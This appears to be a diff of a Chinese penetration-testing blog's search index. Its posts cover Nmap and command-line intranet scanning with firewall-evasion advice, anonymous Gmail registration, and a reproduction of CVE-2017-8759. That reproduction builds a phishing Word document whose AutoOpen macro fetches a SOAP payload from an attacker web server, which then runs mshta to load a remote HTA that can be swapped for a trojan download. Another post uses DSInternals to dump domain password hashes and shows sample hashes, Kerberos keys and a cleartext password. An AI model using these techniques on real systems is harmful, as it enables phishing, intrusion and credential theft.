-<p>Nmap可以检测目标主机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息。 它是网络管理员必用的软件之一，用以评估网络系统安全。<br>Nmap 是不少黑客及脚本小孩爱用的工具 。系统管理员可以利用Nmap来探测工作环境中未经批准使用的服务器，黑客通常会利用Nmap来搜集目标电脑的网络设定，从而计划攻击的方法。<br>Nmap通常用在信息搜集阶段，用于搜集目标机主机的基本状态信息。扫描结果可以作为漏洞扫描、漏洞利用和权限提升阶段的输入。例如，业界流行的漏洞扫描工具Nessus与漏洞利用工具Metasploit都支持导入Nmap的XML格式结果，而Metasploit框架内也集成了Nmap工具（支持Metasploit直接扫描）。<br>Nmap不仅可以用于扫描单个主机，也可以适用于扫描大规模的计算机网络（例如，扫描英特网上数万台计算机，从中找出感兴趣的主机和服务）。</p>
-<h1 id="0x01-命令及参数介绍"><a href="#0x01-命令及参数介绍" class="headerlink" title="0x01 命令及参数介绍"></a>0x01 命令及参数介绍</h1><h2 id="常见端口扫描"><a href="#常见端口扫描" class="headerlink" title="常见端口扫描"></a>常见端口扫描</h2><blockquote>
-<p>map [Scan Type(s)] [Options] {target specification}<br>scan type(s) 用于指定扫描类型<br>options 用于指定选项<br>target specification 用于指定扫描目标</p>
-<p>-s 指定扫描类型<br>如下：<br>-sP (ping扫描) *存活主机探测<br>-sS (TCP SYN扫描 隐身扫描)  *默认扫描方式<br>-sT (tcp 扫描) * syn 不能用时就tcp扫描<br>-sU （UDP 扫描）<br>-sA  （ACK扫描） *三次握手 用于探测出防火墙过滤端口 实际渗透中没多大用<br>-sV   （版本探测）<br>-A    操作系统探测<br>-O （启用操作系统检测）<br>-v    详细<br>选项说明：<br>-P0  [指定端口] (无ping扫描)<br>-PU  [指定端口] (udp ping扫描)<br>-PS [指定端口] (TCP SYN ping 扫描)<br>-PA  [指定端口] (tcp ack ping扫描)<br>-PI   使用真正的pingICMP echo请求来扫描目标主机是否正在运行<br>-iL 指定扫描主机列表<br>-iR 随机选择目标<br>–exclude 排除扫描目标<br>–excludefile 排除文件中目标列表<br>-n (不用域名解析)<br>-R (为所有目标解析域名)<br>-T  时间优化（每隔多久发一次包 ） -T5 最快 -T0 最慢<br>-F  快速扫描<br>-e  指定网络接口<br>-M 设置tcp扫描线程</p>
-</blockquote>
-<h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><blockquote>
-<p>-oS   “1337格式” 保存扫描结果输出<br>-oN  把扫描结果重定向到一个可读的文件logfilename中<br>-oM  每个结果一行输出<br>-oA 同上<br>–append-output 附在原来的结果前面</p>
-</blockquote>
-<h2 id="Nmap端口6个状态"><a href="#Nmap端口6个状态" class="headerlink" title="Nmap端口6个状态"></a>Nmap端口6个状态</h2><blockquote>
-<p>open（开放的）<br>closed（关闭的）<br>filtered（被过滤的）不确定开放还是关闭<br>unfiltered （未被过滤的）<br>openfiltered （开放或者被过滤的）<br>closedfiltered （关闭或者未被过滤的）</p>
-</blockquote>
-<h2 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h2><h3 id="获取远程主机的系统类型及开放端口"><a href="#获取远程主机的系统类型及开放端口" class="headerlink" title="获取远程主机的系统类型及开放端口"></a>获取远程主机的系统类型及开放端口</h3><blockquote>
-<p>nmap -sS -P0 -sV -O</p>
-</blockquote>
-<h3 id="获取ip和mac地址："><a href="#获取ip和mac地址：" class="headerlink" title="获取ip和mac地址："></a>获取ip和mac地址：</h3><blockquote>
-<p>nmap -sP -PI -PT -oN 192.168.1.0/24</p>
-</blockquote>
-<h3 id="扫描存活主机"><a href="#扫描存活主机" class="headerlink" title="扫描存活主机"></a>扫描存活主机</h3><blockquote>
-<p>nmap -sP -n 192.168.10.0/24 | cut -d” “ -f5 | awk “/192/“</p>
-</blockquote>
-<p>windows:</p>
-<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP -n <span class="number">192</span>.<span class="number">168</span>.<span class="number">10</span>.<span class="number">0</span>/<span class="number">24</span> | <span class="built_in">find</span> "<span class="number">192</span>" &gt;tmp_active001&amp;<span class="keyword">for</span> /f "tokens=<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>" %i <span class="keyword">in</span> (tmp_active001)<span class="keyword">do</span> @<span class="built_in">echo</span> %m</span><br></pre></td></tr></table></figure>
-
-<h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><p>漏洞脚本根据Nmap,GitHub官方项目script文件夹下查看:<a href="https://github.com/nmap/nmap/tree/master/scripts" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/nmap/nmap/tree/master/scripts</a></p>
-<blockquote>
-<p>nmap -P0 –script=smb-check-vulns –script-args=unsafe=1 -iL ip.txt</p>
-</blockquote>
-<h2 id="扫描常见端口"><a href="#扫描常见端口" class="headerlink" title="扫描常见端口:"></a>扫描常见端口:</h2><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -O -P0 -T5 --open -oN result.txt -p80-<span class="number">89</span>,<span class="number">8080</span>-<span class="number">8099</span>,<span class="number">8000</span>-<span class="number">8009</span>,<span class="number">7001</span>-<span class="number">7009</span>,<span class="number">9000</span>-<span class="number">9099</span>,<span class="number">21</span>,<span class="number">443</span>,<span class="number">873</span>,<span class="number">2601</span>,<span class="number">2604</span>,<span class="number">3128</span>,<span class="number">4440</span>,<span class="number">6082</span>,<span class="number">6379</span>,<span class="number">8888</span>,<span class="number">3389</span>,<span class="number">9200</span>,<span class="number">11211</span>,<span class="number">27017</span>,<span class="number">28017</span>,<span class="number">389</span>,<span class="number">8443</span>,<span class="number">4848</span>,<span class="number">8649</span>,<span class="number">995</span>,<span class="number">9440</span>,<span class="number">9871</span>,<span class="number">2222</span>,<span class="number">2082</span>,<span class="number">3311</span>,<span class="number">18100</span>,<span class="number">9956</span>,<span class="number">1433</span>,<span class="number">3306</span>,<span class="number">1900</span>,<span class="number">49705</span>,<span class="number">50030</span>,<span class="number">7778</span>,<span class="number">5432</span>,<span class="number">7080</span>,<span class="number">5900</span>,<span class="number">50070</span>,<span class="number">5000</span>,<span class="number">5560</span>,<span class="number">10000</span> <span class="number">63</span>.<span class="number">237</span>.<span class="number">172</span>.<span class="number">115</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>21  ftp  主要看是否支持匿名，也可以跑弱口令<br>80  web  常见web漏洞以及是否为一些管理后台<br>443  openssl  心脏滴血以及一些web漏洞测试<br>873  rsync  主要看是否支持匿名，也可以跑弱口令<br>2601,2604 zebra路由，默认密码zebra<br>3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了<br>4440 rundeck  参考WooYun: 借用新浪某服务成功漫游新浪内网<br>6082  varnish  参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网<br>6379  redis 一般无认证，可直接访问<br>8000-9090  都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上<br>9200  elasticsearch  参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞<br>11211  memcache  未授权访问<br>27017  mongodb  未授权访问<br>28017  mongodb统计页面</p>
-</blockquote>
-<h2 id="扫描巨大网络"><a href="#扫描巨大网络" class="headerlink" title="扫描巨大网络"></a>扫描巨大网络</h2><blockquote>
-<p>-sn    不扫描端口，只ping主机<br>-PE   通过ICMP echo判定主机是否存活<br>-n     不反向解析IP地址到域名<br>–min-hostgroup 1024    最小分组设置为1024个IP地址，当IP太多时，nmap需要分组，然后串行扫描<br>–min-parallelism 1024  这个参数非常关键，为了充分利用系统和网络资源，我们将探针的数目限定最小为1024<br>-oX nmap_output.xml    将结果以XML格式输出，文件名为nmap_output.xml</p>
-</blockquote>
-<p>扫描结束，解析XML文档即可得到哪些IP地址存活.</p>
-<p>附上自己平时用的nmap命令，由于之前发包太大vps被封过一次，所以加了一些限速的参数</p>
-<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sV -O -P0 --open -n -oN result.txt -p80-<span class="number">89</span>,<span class="number">8080</span>-<span class="number">8099</span>,<span class="number">8000</span>-<span class="number">8009</span>,<span class="number">7001</span>-<span class="number">7009</span>,<span class="number">9000</span>-<span class="number">9099</span>,<span class="number">21</span>,<span class="number">443</span>,<span class="number">873</span>,<span class="number">2601</span>,<span class="number">2604</span>,<span class="number">3128</span>,<span class="number">4440</span>,<span class="number">6082</span>,<span class="number">6379</span>,<span class="number">8888</span>,<span class="number">3389</span>,<span class="number">9200</span>,<span class="number">11211</span>,<span class="number">27017</span>,<span class="number">28017</span>,<span class="number">389</span>,<span class="number">8443</span>,<span class="number">4848</span>,<span class="number">8649</span>,<span class="number">995</span>,<span class="number">9440</span>,<span class="number">9871</span>,<span class="number">2222</span>,<span class="number">2082</span>,<span class="number">3311</span>,<span class="number">18100</span>,<span class="number">9956</span>,<span class="number">1433</span>,<span class="number">3306</span>,<span class="number">1900</span>,<span class="number">49705</span>,<span class="number">50030</span>,<span class="number">7778</span>,<span class="number">5432</span>,<span class="number">7080</span>,<span class="number">5900</span>,<span class="number">50070</span>,<span class="number">5000</span>,<span class="number">5560</span>,<span class="number">10000</span> -iL ip.txt</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sV -p80-<span class="number">89</span>,<span class="number">8080</span>-<span class="number">8099</span>,<span class="number">8000</span>-<span class="number">8009</span>,<span class="number">7001</span>-<span class="number">7009</span>,<span class="number">9000</span>-<span class="number">9099</span>,<span class="number">21</span>,<span class="number">443</span>,<span class="number">873</span>,<span class="number">2601</span>,<span class="number">2604</span>,<span class="number">3128</span>,<span class="number">4440</span>,<span class="number">6082</span>,<span class="number">6379</span>,<span class="number">8888</span>,<span class="number">3389</span>,<span class="number">9200</span>,<span class="number">11211</span>,<span class="number">27017</span>,<span class="number">28017</span>,<span class="number">389</span>,<span class="number">8443</span>,<span class="number">4848</span>,<span class="number">8649</span>,<span class="number">995</span>,<span class="number">9440</span>,<span class="number">9871</span>,<span class="number">2222</span>,<span class="number">2082</span>,<span class="number">3311</span>,<span class="number">18100</span>,<span class="number">9956</span>,<span class="number">1433</span>,<span class="number">3306</span>,<span class="number">1900</span>,<span class="number">49705</span>,<span class="number">50030</span>,<span class="number">7778</span>,<span class="number">5432</span>,<span class="number">7080</span>,<span class="number">5900</span>,<span class="number">50070</span>,<span class="number">5000</span>,<span class="number">5560</span>,<span class="number">10000</span> --open --max-hostgroup <span class="number">10</span> --max-parallelism <span class="number">10</span> --max-rtt-timeout <span class="number">1000</span>ms --host-timeout <span class="number">800</span>s --max-scan-delay <span class="number">2000</span>ms -iL ~/Desktop/ip.txt -oN ~/Desktop/result/result.txt</span><br></pre></td></tr></table></figure>
-
-<h1 id="WindoWs自带命令端口扫描及powershell"><a href="#WindoWs自带命令端口扫描及powershell" class="headerlink" title="WindoWs自带命令端口扫描及powershell"></a>WindoWs自带命令端口扫描及powershell</h1><h2 id="bat批量ping获取iP"><a href="#bat批量ping获取iP" class="headerlink" title="bat批量ping获取iP"></a>bat批量ping获取iP</h2><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">setlocal</span> ENABLEDELAYEDEXPANSION</span><br><span class="line">@<span class="keyword">FOR</span> /F "usebackq eol=- skip=<span class="number">1</span> delims=\" <span class="variable">%%j</span> <span class="keyword">IN</span> (`<span class="built_in">net</span> view ^| <span class="built_in">find</span> "命令成功完成" /v ^|<span class="built_in">find</span> "The command completed successfully." /v`) <span class="keyword">DO</span> (</span><br><span class="line">@<span class="keyword">FOR</span> /F "usebackq delims=" <span class="variable">%%i</span> <span class="keyword">IN</span> (`@<span class="built_in">ping</span> -n <span class="number">1</span> -<span class="number">4</span> <span class="variable">%%j</span> ^| <span class="built_in">findstr</span> "Pinging"`) <span class="keyword">DO</span> (</span><br><span class="line">@<span class="keyword">FOR</span> /F "usebackq tokens=<span class="number">2</span> delims=[]" <span class="variable">%%k</span> <span class="keyword">IN</span> (`<span class="built_in">echo</span> <span class="variable">%%i</span>`) <span class="keyword">DO</span> (<span class="built_in">echo</span> <span class="variable">%%k</span> <span class="variable">%%j</span>)</span><br><span class="line">)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-
-<h2 id="内网无工具扫描"><a href="#内网无工具扫描" class="headerlink" title="内网无工具扫描"></a>内网无工具扫描</h2><p>一条 cmd 命令解决：</p>
-<blockquote>
-<p>for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1 | find /i “ttl”<br>ping 整个 c 段，只输出有响应的主机。</p>
-</blockquote>
-<blockquote>
-<p>% H” g% Q+ _6 q- P7 t<br>更变态的：</p>
-</blockquote>
-<blockquote>
-<p>4 o4 g8 X- v9 x&amp; w<br>域机器对应 IP</p>
-</blockquote>
-<blockquote>
-<p>FOR /F “eol=- tokens=1 delims=\ “ %a IN (‘net view’) DO @(echo name: %a, ip: &amp; ping %a -w 1 -n 1 |<br>find /i “ttl” &amp; echo.)<br>把 net view 的结果，挨个 ping 一遍，并输出机器名和 ip 地址。</p>
-</blockquote>
-<p>找主机名</p>
-<blockquote>
-<p>for /l %i in (1,1,255) do @ping -a 10.0.1.%i -w 1 -n 1 | find /i “Pinging”<br>B 段查找</p>
-</blockquote>
-<blockquote>
-<p>for /l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i “Pinging”<br>Win7</p>
-</blockquote>
-<blockquote>
-<p>for /l %i in (1,1,255) do @ping -a 10.0.1.%i -w 1 -n 1 | find /i “Pinging”<br>for /l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i “Pinging”<br>改成</p>
-</blockquote>
-<blockquote>
-<p>for /l %i in (1,1,255) do @ping -a 10.0.1.%i -w 1 -n 1 | find /i “Ping”<br>for /l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i “Ping”<br>就可以兼容 Win7 了。（Win7 ping -a 输出结果关键词为 “Ping”）</p>
-</blockquote>
-<p>另外findstr /i “pinging” 或 findstr /i “ping” 可以换成 findstr “[” 的 可以适合多语言环境</p>
-<h2 id="PowerShell-IPv4NetworkScanner"><a href="#PowerShell-IPv4NetworkScanner" class="headerlink" title="PowerShell_IPv4NetworkScanner"></a>PowerShell_IPv4NetworkScanner</h2><h3 id="Syntax"><a href="#Syntax" class="headerlink" title="Syntax"></a>Syntax</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.\IPv4NetworkScan.ps1 [-StartIPv4Address] &lt;IPAddress&gt; [-EndIPv4Address] &lt;IPAddress&gt; [[-Tries] &lt;Int32&gt;] [[-Threads] &lt;Int32&gt;] [[-DisableDNSResolving]] [[-EnableMACResolving]] [[-ExtendedInformations]] [[-IncludeInactive]] [&lt;CommonParameters&gt;]</span><br><span class="line"></span><br><span class="line">.\IPv4NetworkScan.ps1 [-IPv4Address] &lt;IPAddress&gt; [-Mask] &lt;String&gt; [[-Tries] &lt;Int32&gt;] [[-Threads] &lt;Int32&gt;] [[-DisableDNSResolving]] [[-EnableMACResolving]] [[-ExtendedInformations]] [[-IncludeInactive]] [&lt;CommonParameters&gt;]</span><br><span class="line"></span><br><span class="line">.\IPv4NetworkScan.ps1 [-IPv4Address] &lt;IPAddress&gt; [-CIDR] &lt;Int32&gt; [[-Tries] &lt;Int32&gt;] [[-Threads] &lt;Int32&gt;] [[-DisableDNSResolving]] [[-EnableMACResolving]] [[-ExtendedInformations]] [[-IncludeInactive]] [&lt;CommonParameters&gt;]</span><br></pre></td></tr></table></figure>
-
-<h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS&gt; .\IPv4NetworkScan.ps1 -StartIPv4Address <span class="number">192</span>.<span class="number">168</span>.<span class="number">178</span>.<span class="number">0</span> -EndIPv4Address <span class="number">192</span>.<span class="number">168</span>.<span class="number">178</span>.<span class="number">20</span></span><br><span class="line"></span><br><span class="line">IPv4Address   Status Hostname</span><br><span class="line">-----------   ------ --------</span><br><span class="line"><span class="number">192</span>.<span class="number">168</span>.<span class="number">178</span>.<span class="number">1</span> Up     fritz.box</span><br></pre></td></tr></table></figure>
-
-<h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS&gt; .\IPv4NetworkScan.ps1 -IPv4Address <span class="number">192</span>.<span class="number">168</span>.<span class="number">178</span>.<span class="number">0</span> -Mask <span class="number">255</span>.<span class="number">255</span>.<span class="number">255</span>.<span class="number">0</span> -DisableDNSResolving</span><br><span class="line"></span><br><span class="line">IPv4Address    Status</span><br><span class="line">-----------    ------</span><br><span class="line"><span class="number">192</span>.<span class="number">168</span>.<span class="number">178</span>.<span class="number">1</span>  Up</span><br><span class="line"><span class="number">192</span>.<span class="number">168</span>.<span class="number">178</span>.<span class="number">22</span> Up</span><br></pre></td></tr></table></figure>
-
-<h3 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3"></a>Example 3</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS&gt; .\IPv4NetworkScan.ps1 -IPv4Address <span class="number">192</span>.<span class="number">168</span>.<span class="number">178</span>.<span class="number">0</span> -CIDR <span class="number">25</span> -EnableMACResolving</span><br><span class="line"></span><br><span class="line">IPv4Address    Status Hostname           MAC               Vendor</span><br><span class="line">----------- ------ --------           ---               ------</span><br><span class="line"><span class="number">192</span>.<span class="number">168</span>.<span class="number">178</span>.<span class="number">1</span>  Up     fritz.box          XX-XX-XX-XX-XX-XX AVM Audiovisuelles Marketing und &gt;Computersysteme GmbH</span><br><span class="line"><span class="number">192</span>.<span class="number">168</span>.<span class="number">178</span>.<span class="number">22</span> Up     XXXXX-PC.fritz.box XX-XX-XX-XX-XX-XX ASRock Incorporation</span><br></pre></td></tr></table></figure>
-
-<p>下载链接: <a href="https://github.com/BornToBeRoot/PowerShell_IPv4NetworkScanner.git" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/BornToBeRoot/PowerShell_IPv4NetworkScanner.git</a></p>
-<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>建议大家在内网渗透中尽量使用内网无工具或PowerShell进行端口探测与扫描,防止防火墙报警、拦截</p>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul>
-<li><a href="http://wolvez.club/?p=480" rel="external nofollow noopener noreferrer" target="_blank">nmap语法</a></li>
-<li><a href="http://www.mottoin.com/92978.html" rel="external nofollow noopener noreferrer" target="_blank">内网渗透测试定位技术总结</a></li>
-</ul>
-]]></content>
-      
-        <categories>
-            
-            <category> 渗透教程 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> 漏洞利用 </tag>
-            
-            <tag> 渗透教程 </tag>
-            
-            <tag> nmap中文教程 </tag>
-            
-            <tag> 端口扫描 </tag>
-            
-            <tag> 漏洞扫描 </tag>
-            
-            <tag> 内网渗透 </tag>
-            
-            <tag> 防火墙 </tag>
-            
-            <tag> powershell端口扫描 </tag>
-            
-            <tag> bat端口扫描 </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[CVE-2017-8759-微软.net远程代码执行漏洞复现]]></title>
-      <url>/2017/09/14/CVE-2017-8759-Exploit/</url>
-      <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>漏洞名称：.NET Framework远程代码执行漏洞<br>漏洞编号：CVE-2017-8759<br>漏洞影响：.NET系列产品的远程代码执行（RCE）并进一步控制系统<br>利用场景：远程钓鱼、社会工程（打开有惊喜哟）<br>影响版本：以下.NET版本<br>    Microsoft .NET Framework 4.6.2<br>    Microsoft .NET Framework 4.6.1<br>    Microsoft .NET Framework 3.5.1<br>    Microsoft .NET Framework 4.7<br>    Microsoft .NET Framework 4.6<br>    Microsoft .NET Framework 4.5.2<br>    Microsoft .NET Framework 3.5<br>    Microsoft .NET Framework 2.0 SP2<br>影响产品：Office(word excel)Edge IE WinOS Skype Lync Sharepoint<br>加固方法：软件类漏洞，微软补丁会悄悄地告诉你<br><a href="https://portal.msrc.microsoft.com/en-us/security-guidance" rel="external nofollow noopener noreferrer" target="_blank">https://portal.msrc.microsoft.com/en-us/security-guidance</a></p>
-<h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><blockquote>
-<p>本次测试环境:Windows 2007 x64、Kali Linux X64、Python、Office Word 2016 X64</p>
-</blockquote>
-<p>本次测试攻击利用Word宏,其他方法暂未测试.</p>
-<h2 id="从GitHub下载文件"><a href="#从GitHub下载文件" class="headerlink" title="从GitHub下载文件"></a>从GitHub下载文件</h2><pre><code>git clone https://github.com/Voulnet/CVE-2017-8759-Exploit-sample.git</code></pre><h2 id="修改文件夹exploit-txt内容"><a href="#修改文件夹exploit-txt内容" class="headerlink" title="修改文件夹exploit.txt内容"></a>修改文件夹exploit.txt内容</h2><pre><code>&lt;soap:address location=&quot;http://127.0.0.1:8080?C:\Windows\System32\mshta.exe?http://127.0.0.1:8080/cmd.hta&quot;/&gt;</code></pre><p>  soap标签内的ip地址替换成你的Web服务器地址</p>
-<p><img src="http://cdn.killlan.com/b91a93af39ddc3689ce4650b90556b86.png" alt="修改Http服务Ip地址"></p>
-<h2 id="修改cmd-hta内容"><a href="#修改cmd-hta内容" class="headerlink" title="修改cmd.hta内容"></a>修改cmd.hta内容</h2><p>本次不做修改,仅做测试[替换标注内容为木马下载链接或其他姿势进行远程攻击]</p>
-<p><img src="http://cdn.killlan.com/3898eea3f7bcc0e65159b05590888dd3.png" alt="cmdhta修改"></p>
-<h2 id="启动Http服务器"><a href="#启动Http服务器" class="headerlink" title="启动Http服务器"></a>启动Http服务器</h2><pre><code>python -m SimpleHTTPServer 8080</code></pre><h2 id="新建word文档"><a href="#新建word文档" class="headerlink" title="新建word文档"></a>新建word文档</h2><p>  可以利用从GitHub下载的word直接修改宏,在这里我给大家直接新建演示一次.</p>
-<p>新建一个格式为doc的文档,内容自定义主要目的是利用社工诱导用户打开文档及相信该文档是正常文档未涉及钓鱼攻击.</p>
-<p>新建宏步骤:视图-宏-宏名”AutoOpen”-创建,输入代码为:</p>
-<pre><code>Sub AutoOpen()
-Set x = GetObject(&quot;soap:wsdl=http://127.0.0.1:8080/exploit.txt&quot;)
-End Sub</code></pre><p>同样上面的IP替换你的Http服务器地址</p>
-<p><img src="http://cdn.killlan.com/9fbe01e3c0b9d1b15acf412dcaa22b43.png" alt="宏名"></p>
-<p>Ctrl+s保存一下,然后点右上角的word图标返回到word界面.</p>
-<h1 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h1><p>由于我先前测试时启用了宏,所以没有提示,首次运行会提示需要启用宏.打开文档会生成三个文件在当前路径下.</p>
-<p><img src="http://cdn.killlan.com/e31kh41321234123jh.gif" alt="运行结果"></p>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul>
-<li><a href="http://mp.weixin.qq.com/s?timestamp=1505395851&src=3&ver=1&signature=Pz9jna73kaP-IyzHn*bKH5irhtoFJ5AELMHRDjhL9tYfSqS1EKXFDBqvgXMTuqL98G1ujtmI6aIbWOs5dff9GfHyZIJVhdBnCiu-QXL*uMERjmoO02zpVh-mOJPio9HuFGtZPe22zRbdm3W*Lbn*P24caa96rOt1tXrD98r07PA=" rel="external nofollow noopener noreferrer" target="_blank">微软.NET远程代码执行漏洞0day分析(社工钓鱼)</a></li>
-<li><a href="https://www.youtube.com/watch?v=hlkx5uYBT1Y" rel="external nofollow noopener noreferrer" target="_blank">CVE-2017-8759-Weaponisation Tutorial</a></li>
-<li><a href="https://www.youtube.com/watch?v=nHXKnTTtWk8" rel="external nofollow noopener noreferrer" target="_blank">CVE2017-8759 - RTF WSDL SOAP Parser Vulnerability 1-day</a></li>
-</ul>
-]]></content>
-      
-        <categories>
-            
-            <category> 漏洞利用 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> 漏洞利用 </tag>
-            
-            <tag> exploit </tag>
-            
-            <tag> cve-2017-8759 </tag>
-            
-            <tag> 微软漏洞 </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[匿名注册谷歌邮箱[已失效]]]></title>
-      <url>/2017/09/13/anonymous-register-gmail/</url>
-      <content type="html"><![CDATA[<blockquote>
-<p>不需要邮箱验证，不需要手机验证</p>
-</blockquote>
-<h1 id="注册步骤"><a href="#注册步骤" class="headerlink" title="注册步骤:"></a>注册步骤:</h1><ol>
-<li><p>从 <a href="http://www.gmail.com" rel="external nofollow noopener noreferrer" target="_blank">www.gmail.com</a> 入口，点击注册。</p>
-</li>
-<li><p>姓氏要手打。（No老师说的）</p>
-</li>
-<li><p>电话区域的区号选择 特克斯和凯科斯群岛 (Turks &amp; Caicos Islands)</p>
-</li>
-<li><p>邮件区域不用填写</p>
-</li>
-<li><p>地区选择 特里斯坦-达库尼亚群岛 (Tristan da Cunha)</p>
-</li>
-</ol>
-<h1 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h1><p>如遇到需要输入电话号码验证gmail邮箱<br><img src="http://cdn.killlan.com/0ec805a7b175d0b9ba642f8a6417d1e5.png" alt="phonegamil"></p>
-<p>直接网页后退在前进即可解决此问题。</p>
-<h1 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果:"></a>测试结果:</h1><p>需使用香港未注册gmail账户的Ss&amp;Vpn,才能注册成功,不建议批量注册及频繁注册</p>
-<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul>
-<li><a href="http://www.evilclay.com/2016/08/21/%E5%8C%BF%E5%90%8D%E6%B3%A8%E5%86%8CGoogle%E9%82%AE%E7%AE%B1/" title="匿名注注册Google邮箱" rel="external nofollow noopener noreferrer" target="_blank">匿名注注册Google邮箱</a></li>
-</ul>
-]]></content>
-      
-        <categories>
-            
-            <category> 福利 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> 匿名注册谷歌邮箱 </tag>
-            
-            <tag> 香港Vpn </tag>
-            
-            <tag> Gmail </tag>
-            
-        </tags>
-        
-    </entry>
-    
-  
-  
+<search>
+  <entry>
+    <title><![CDATA[Powershell快速导出域HASH(DSInternals)]]></title>
+    <url>%2F2019%2F08%2F31%2Fpowershell-dsinternals-ntlm%2F</url>
+    <content type="text"><![CDATA[简述我们都知道域NTDS.dit文件域用户越多文件越大,我见过的ntds文件起码以G为单位,把ntds大文件拉回到本地实属不便,并且易被流量监控设备发觉 DSInternals使用方法1、PowerShell 5.0： Install-Module DSInternals2、PowerShell 3.0、4.0解压压缩包cd C:\test\DSInternalsImport-Module .\DSInternals 导出所有域用户HASH 1Get-ADReplAccount -All -NamingContext 'DC=Adatum,DC=com' -Server LON-DC1 如上图过W+用户,ntds文件绝壁超过G,导出域hash才200左右MB该工具有许多模块,需要自行官网查看 输出内容: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101DistinguishedName: CN=April Reagan,OU=IT,DC=Adatum,DC=comSid: S-1-5-21-3180365339-800773672-3767752645-1375Guid: 124ae098-699b-4450-a47a-314a29cc90eaSamAccountName: AprilSamAccountType: UserUserPrincipalName: April@adatum.comPrimaryGroupId: 513SidHistory: Enabled: TrueDeleted: FalseLastLogon: DisplayName: April ReaganGivenName: AprilSurname: ReaganDescription: NTHash: 92937945b518814341de3f726500d4ffLMHash: 727e3576618fa1754a3b108f3fa6cb6dNTHashHistory: Hash 01: 92937945b518814341de3f726500d4ff Hash 02: 1d3da193d2f45911a6f0fa940b9fb32f Hash 03: 402bc59d8a00641b7f386e78596340f4LMHashHistory: Hash 01: 727e3576618fa1754a3b108f3fa6cb6d Hash 02: 5a5503d0e85f58abaad3b435b51404ee Hash 03: f9393d97e7a1873caad3b435b51404eeSupplementalCredentials: ClearText: Pa$$w0rd Kerberos: Credentials: DES_CBC_MD5 Key: 76fe3b5bda911a40 OldCredentials: DES_CBC_MD5 Key: 7f8c4f38e0ea0b80 Salt: ADATUM.COMApril Flags: 0 KerberosNew: Credentials: AES256_CTS_HMAC_SHA1_96 Key: 3a3b6a89bb82d112db5ef68f6db5d1afc2b806df61dcd85e3eacf3b85ee382d8 Iterations: 4096 AES128_CTS_HMAC_SHA1_96 